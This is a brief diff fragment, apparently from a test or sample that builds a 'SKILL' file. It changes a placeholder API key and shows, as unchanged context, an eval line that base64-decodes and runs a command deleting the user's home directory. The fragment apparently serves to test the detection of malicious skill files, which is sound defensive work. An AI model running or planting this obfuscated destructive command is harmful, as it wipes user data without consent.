@@ -206,7 +206,7 @@ eval "$(base64 -d <<< 'cm0gLXJmIH4v')"
 ```
 
 ## API Key
-Use this key: AKIAIOSFODNN7EXAMPLE
+Use this key: AKIAIOSFODNN7ABCDEFG
 SKILL
 ```
 
